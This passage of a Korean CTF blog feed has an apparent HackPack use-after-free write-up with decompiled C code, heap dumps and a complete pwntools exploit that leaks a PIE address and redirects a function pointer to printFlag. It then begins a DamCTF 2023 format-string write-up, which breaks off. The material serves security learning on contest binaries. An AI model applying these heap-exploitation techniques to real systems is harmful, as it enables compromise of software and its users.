Quit\n\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;Choose option: &quot;</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)getUserNum() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        printStr(<span class="string">&quot;Enter index of new number (0-9): &quot;</span>);</span><br><span class="line">        UserNum = getUserNum();</span><br><span class="line">        <span class="keyword">if</span> ( UserNum &gt;= <span class="number">10</span> )</span><br><span class="line">          <span class="keyword">goto</span> Index_out_of_bound;</span><br><span class="line">        createStaticNum(UserNum, (__int64)Number_obj);</span><br><span class="line">        <span class="built_in">strncpy</span>(&amp;Number_obj_copy[<span class="number">16</span> * UserNum], Number_obj[UserNum], <span class="number">0xF</span>uLL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        printStr(<span class="string">&quot;Enter index of number to delete (0-9): &quot;</span>);</span><br><span class="line">        IndexNum = getUserNum();</span><br><span class="line">        <span class="keyword">if</span> ( IndexNum &lt; <span class="number">10</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          deleteObject(IndexNum, (__int64)Number_obj);</span><br><span class="line">          <span class="built_in">strncpy</span>(&amp;Number_obj_copy[<span class="number">16</span> * IndexNum], <span class="string">&quot;none&quot;</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          printStr(<span class="string">&quot;Invalid Index!\n&quot;</span>);         <span class="comment">// 음수 안됨 oob x</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        printStr(<span class="string">&quot;Enter index of number to edit (0-9): &quot;</span>);</span><br><span class="line">        edit_idx = getUserNum();</span><br><span class="line">        <span class="keyword">if</span> ( edit_idx &lt; <span class="number">0xA</span> )</span><br><span class="line">          editObject(edit_idx, (__int64)Number_obj);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          printStr(<span class="string">&quot;Invalid Index\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        printStr(<span class="string">&quot;Select index of number to print (0-9): &quot;</span>);</span><br><span class="line">        print_idx = getUserNum();</span><br><span class="line">        <span class="keyword">if</span> ( print_idx &gt;= <span class="number">0xA</span> )</span><br><span class="line">Index_out_of_bound:</span><br><span class="line">          printStr(<span class="string">&quot;Index out of bounds!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          readObject(print_idx, (__int64)Number_obj);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        showList((__int64)Number_obj_copy);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !_func_result )</span><br><span class="line">          _func_result = createRandomNum();</span><br><span class="line">        func_result = ((__int64 (*)(<span class="type">void</span>))_func_result[<span class="number">2</span>])();<span class="comment">// printFlag 실행해야함</span></span><br><span class="line">        _func_result[<span class="number">1</span>] = *_func_result;</span><br><span class="line">        *_func_result = func_result;</span><br><span class="line">        <span class="keyword">goto</span> print_random_num;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7u</span>:</span><br><span class="line">print_random_num:</span><br><span class="line">        <span class="keyword">if</span> ( _func_result )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, *_func_result);       </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          printStr(<span class="string">&quot;No Random Number has been generated\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8u</span>:</span><br><span class="line">        printStr(<span class="string">&quot;Access Denied\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9u</span>:</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        printStr(<span class="string">&quot;Option does not exist\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printStr(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( _func_result )</span><br><span class="line">    <span class="built_in">free</span>(_func_result);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;Number_obj_copy[<span class="number">16</span> * j], <span class="string">&quot;none&quot;</span>) )</span><br><span class="line">      <span class="built_in">free</span>((<span class="type">void</span> *)Number_obj[j]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(Number_obj_copy);</span><br><span class="line">  <span class="built_in">free</span>(Number_obj);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>일단 1번 메뉴를 살펴보자. <code>createStaticNum</code> 함수이다. 참고로 여러 기능을 실행하기 전에 <code>getUserNum</code> 함수를 통해 인덱스를 받아오는데 음수를 잘 거르고 있으니 oob와 같은 취약점이 발생할 수 없다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *__fastcall <span class="title function_">createStaticNum</span><span class="params">(<span class="type">int</span> idx, __int64 obj)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *name_ptr; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  name_ptr = <span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">  printStr(<span class="string">&quot;Enter object name: &quot;</span>);</span><br><span class="line">  getName(name_ptr);</span><br><span class="line">  printStr(<span class="string">&quot;Enter number: &quot;</span>);</span><br><span class="line">  name_ptr[<span class="number">2</span>] = getUserNum();</span><br><span class="line">  result = name_ptr;</span><br><span class="line">  *(_QWORD *)(obj + <span class="number">8LL</span> * idx) = name_ptr;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>idx</code>와 <code>obj</code>가 인자로 넘어왔다. <code>malloc</code>을 통해서 <code>name</code>을 입력받는 공간을 할당한다. 그러니깐 <code>obj</code>는 아래처럼 생겼다. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">name_ptr + 0x00: name</span><br><span class="line">name_ptr + 0x10: name</span><br><span class="line">name_ptr + 0x18: num</span><br><span class="line">...</span><br><span class="line">obj + 0x00: name_ptr </span><br><span class="line">obj + 0x08: name_ptr A</span><br><span class="line">obj + 0x10: name_ptr B</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>디버깅하면서 처음 알게되었는데 늦게 malloc되면 주소가 위로 올라간다. </p><p>이제 <code>deleteObject</code> 함수를 살펴보자.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">deleteObject</span><span class="params">(<span class="type">int</span> idx, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(*(<span class="type">void</span> **)(<span class="number">8LL</span> * idx + a2));             <span class="comment">// free하고 나서 데이터를 초기화 시켜줘야하는데 안 시켜줌</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>주석에도 적혀있듯이, <code>free</code>하고 나서 데이터도 함께 초기화 시켜줘야하는데 안 시켜줬다. 그러면 데이터가 그대로 남아있게 된다.</p><ul><li><p>입력</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">createStaticNum(0, &#x27;aaaa&#x27;, 1234)</span><br></pre></td></tr></table></figure></li><li><p>free 전</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># name_ptr</span><br><span class="line">0x55fa7d9683b0: 0x0000000061616161      0x0000000000000000</span><br><span class="line">0x55fa7d9683c0: 0x00000000000004d2</span><br><span class="line"></span><br><span class="line"># obj</span><br><span class="line">0x55fa7d9682a0: 0x000055fa7d9683b0</span><br></pre></td></tr></table></figure></li><li><p>free 후</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># name_ptr</span><br><span class="line">0x55fa7d9683b0: 0x000000055fa7d968      0x672609a652e683d0</span><br><span class="line">0x55fa7d9683c0: 0x00000000000004d2</span><br><span class="line"></span><br><span class="line"># obj</span><br><span class="line">0x55fa7d9682a0: 0x000055fa7d9683b0</span><br></pre></td></tr></table></figure></li></ul><p><code>name</code> 부분은 이상해졌는데,.. <code>num</code>은 그대로 보존되어 있다. 해제 후에도 이 값을 이용할 수 있기 때문에 이 값을 이용할 것이다. (int)라서 주소 넣기 딱 좋아보인다.</p><p>이제 또 다른 <code>malloc</code>을 찾을 것이다. 왜냐하면 <code>heap chunk</code>를 해제하고 똑같은 크기의 <code>heap chunk</code>를 할당하면 동일한 위치한다는 것을 이용할 것이기 때문이다. <code>malloc</code>을 사용하는 곳이 총 두 곳 있는데, 하나는 위의  <code>createStaticNum</code> 함수이고 다른 하나는 <code>createRandomNum</code>이다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *<span class="title function_">createRandomNum</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  srand(<span class="number">0</span>);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">  buf[<span class="number">2</span>] = generateRandNum;                     <span class="comment">// 함수 포인터</span></span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  *buf = <span class="number">0LL</span>;</span><br><span class="line">  write(<span class="number">1</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>이 구조는 아래와 같이 생겼다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf + 0x00: 0</span><br><span class="line">buf + 0x10: 0</span><br><span class="line">buf + 0x18: generateRandNum func_ptr</span><br></pre></td></tr></table></figure><p>이 구조는 뭔가 아까 위에서 본 name_ptr과 유사하다. 서로 다른 구조체가 있는데 용도는 다르지만 크기가 동일하다. A 용도에서 해제할 때 데이터가 초기화가 되지 않아 B 용도일 때 사용될 수 있다. uaf 취약점은 보통 이렇게 이용된다. </p><p><code>createRandomNum</code> 함수는 아래와 같이 <code>main</code> 함수에서 호출되고 이용된다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main</span></span><br><span class="line">      <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !_func_result )</span><br><span class="line">          _func_result = createRandomNum();</span><br><span class="line">        func_result = ((__int64 (*)(<span class="type">void</span>))_func_result[<span class="number">2</span>])();<span class="comment">// printFlag 실행</span></span><br><span class="line">        _func_result[<span class="number">1</span>] = *_func_result;</span><br><span class="line">        *_func_result = func_result;</span><br><span class="line">        <span class="keyword">goto</span> print_random_num;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7u</span>:</span><br><span class="line">print_random_num:</span><br><span class="line">        <span class="keyword">if</span> ( _func_result )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, *_func_result);       </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          printStr(<span class="string">&quot;No Random Number has been generated\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p><code>_func_result</code>가 없는 경우 <code>createRandomNum</code> 함수를 통해 랜덤한 수를 받아온다. 랜덤한 수를 어떻게 받아오냐? <code>func_result = ((__int64 (*)(void))_func_result[2])();</code> 이 라인을 통해 <code>createRandomNum</code> 함수에서 메모리에 저장한 <code>generateRandNum</code> 함수 포인터를 실행한다. 그 결과를 7번 메뉴에서 출력할 수 있다. </p><p>우리는 <code>generateRandNum</code> 함수 대신 <code>printFlag</code> 함수를 실행할 것이다. 그러면 바로 <code>func_result = ((__int64 (*)(void))_func_result[2])();</code> 이 라인에서 함수가 실행되어 <code>flag.txt</code>가 보일 것이다.</p><h3 id="How-to-leak"><a href="#How-to-leak" class="headerlink" title="How to leak"></a>How to leak</h3><p>문제는 이 문제에 <code>pie</code>가 걸려있다. <code>leak</code>은 어떻게 하면 좋을까? 아래 함수를 이용하자.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">readObject</span><span class="params">(<span class="type">int</span> idx, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  s = *(<span class="type">char</span> **)(<span class="number">8LL</span> * idx + a2);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, *((_QWORD *)s + <span class="number">2</span>));   <span class="comment">// 주소 leak</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>*((_QWORD *)s + 2)</code>을 출력하는 것으로 보아 <code>name_ptr</code>의 <code>num</code>을 출력해준다. 이 함수를 통해 <code>leak</code>을 할 수 있는데, 먼저 <code>obj</code> 구조체를 만들고 해제한다. 그 다음 <code>createRandomNum</code> 함수를 통해 <code>obj[x]</code>가 가리키는 <code>name_ptr+2</code> 즉 <code>num</code> 위치에 <code>generateRandNum</code> 함수 포인터가 위치하게 한다. 마지막으로 <code>readObject</code> 함수를 실행시켜 <code>generateRandNum</code> 함수의 주소를 구하고 <code>pie address</code>까지 구할 수 있다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li><code>createStaticNum</code> 함수를 이용하여 <code>malloc</code></li><li><code>deleteObject</code> 함수를 이용하여 <code>free</code></li><li><code>createRandomNum</code> 함수를 이용하여 <code>num</code> 위치에 <code>func_ptr</code>이 위치하도록 <code>malloc</code></li><li><code>readObject</code> 함수를 이용하여 <code>pie</code> 주소 <code>leak</code></li><li><code>deleteObject</code> 함수를 이용하여 <code>free</code></li><li><code>createStaticNum</code> 함수를 이용하여 <code>malloc</code> 이 때 <code>num</code> 위치에 <code>printFlag</code> 함수 주소 입력</li><li><code>deleteObject</code> 함수를 이용하여 <code>free</code></li><li><code>6</code>번 메뉴를 이용하여 <code>printFlag</code> 함수 실행<ul><li>이것이 가능한 이유가 아래와 같이 태초에 한 번만 random한 수를 받기 때문이다. <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">    <span class="keyword">if</span> ( !_func_result )</span><br><span class="line">    _func_result = createRandomNum();</span><br><span class="line">    func_result = ((__int64 (*)(<span class="type">void</span>))_func_result[<span class="number">2</span>])();<span class="comment">// printFlag 실행</span></span><br></pre></td></tr></table></figure></li><li>3번 과정에서 <code>createRandomNum</code> 함수를 한 번 실행했으므로 <code>_func_result</code>은 이미 값이 채워져있다.</li></ul></li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./chal&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;cha.hackpack.club&#x27;</span>, <span class="number">41705</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createStaticNum</span>(<span class="params">idx, name, addr</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;(0-9): &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name: &#x27;</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;number: &#x27;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deleteObject</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;(0-9): &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak pie</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readObject</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;(0-9): &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createRandomNum</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># show flag.txt</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showRandomNum</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line"></span><br><span class="line">createStaticNum(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">1234</span>)</span><br><span class="line">deleteObject(<span class="number">0</span>)</span><br><span class="line">createRandomNum()</span><br><span class="line">readObject(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>) - <span class="number">0x1257</span></span><br><span class="line">info(<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">deleteObject(<span class="number">0</span>)</span><br><span class="line">createStaticNum(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>, e.address + <span class="number">0x1244</span>) <span class="comment"># e.sym[&#x27;printFlag&#x27;]</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">deleteObject(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">createRandomNum()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;n3v3r_tru5t_fr33_jVmVsEuj&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> HackPack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> uaf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dam CTF 2023 - baby-review (fsb)</title>
      <link href="/230414-damctf2023-baby-review/"/>
      <url>/230414-damctf2023-baby-review/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1872">https://ctftime.org/event/1872</a></li></ul><blockquote><p>unknown</p></blockquote><ul><li>[? solves &#x2F; ? points]</li></ul><p>롸업을 너무 늦게 작성해서 사이트가 닫혔다.. 내가 41번째로 풀었던 것 같다.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *country; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+4Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = time(<span class="number">0LL</span>);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  srand(v3);</span><br><span class="line">  load_countries(v4, argv);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Alright I need to prove you&#x27;re human so lets do some geography&quot;</span>);</span><br><span class="line">  v8 = rand() % num_countries;</span><br><span class="line">  country = (<span class="type">char</span> *)&amp;countries + <span class="number">100</span> * v8;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What is the capital of %s?\n&quot;</span>, country);</span><br><span class="line">  fgets(input, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  input[<span class="built_in">strcspn</span>(input, <span class="string">&quot;\r\n&quot;</span>)] = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(input, country + <span class="number">50</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Incorrect. The capital of %s is %s.\n&quot;</span>, country, country + <span class="number">50</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Alright I&#x27;ll let you through&quot;</span>);</span><br><span class="line">  menu();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>load_countries</code> 함수는 간단하게 이야기하면 서버에 있는 txt 파일에서 country와 capital을 읽어오는 것이다. country는 <code>country</code>에 저장되고 capital은 <code>country + 50</code>에 저장된다. 이 두 개의 데이터를 읽어오는 txt 파일 내부는 아래와 같이 생겼다. <code>,</code> 기준으로 잘라서 읽는다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaaa,bbbb</span><br><span class="line">cccc,dddd</span><br></pre></td></tr></table></figure><p>짝에 맞는 country와 captial을 맞춰주면 <code>menu</code> 함수를 실행하게 되고 본격적인 구현이 시작된다. 참고로 틀리면 정답을 알려주니 remote로 문제를 풀 때 일부러 틀려서 데이터들을 모아서 풀면 된다. 한 번만 맞추면 <code>menu</code> 함수를 실행하니 맞출 때까지 연결했다가 끊어주고 하면 된다.</p><p><code>menu</code> 함수를 보면 5 가지 기능이 있고 각 기능을 살펴봐야 한다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( choice )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">    read_book();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">    watch_movie(fsb);                       <span class="comment">// leak something</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">    review();                               <span class="comment">// put payload</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Sad to see you go.&quot;</span>);             <span class="comment">// bof</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Could I get your name for my records?&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">48uLL</span>);</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">    (fsb);                         <span class="comment">// read(0, fsb, 0x12CuLL);</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>주석에 적힌대로 <code>watch_movie</code> 함수에서는 쉽게 <code>printf(buf)</code>로 인해 대놓고 FSB가 발생한다. 입력은 5번 메뉴인 <code>add_movie</code> 함수에서 아래와 같이 이뤄진다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 